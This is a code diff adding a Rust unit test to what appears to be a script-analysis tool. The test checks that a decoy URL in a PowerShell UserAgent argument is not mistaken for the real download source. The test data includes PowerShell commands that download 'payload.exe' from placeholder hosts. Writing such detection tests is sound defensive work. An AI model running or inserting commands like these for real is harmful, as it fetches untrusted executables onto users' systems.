@@ -9185,6 +9185,33 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_abbreviated_useragent_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-WebRequest -UserA "Mozilla/5.0 https://ua-short.example/info" -Uri https://ps-ua-short-actual.example/payload.exe -OutFile payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://ps-ua-short-actual.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "actual IWR URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ua-short.example/info"
+                )
+            }),
+            "IWR abbreviated UserAgent URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn irm_body_urls_are_not_promoted_to_downloads() {
         let ps = r#"Invoke-RestMethod -Uri https://ps-body-actual.example/api -Method Post -Body "next=https://ps-body-decoy.example/payload.exe""#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
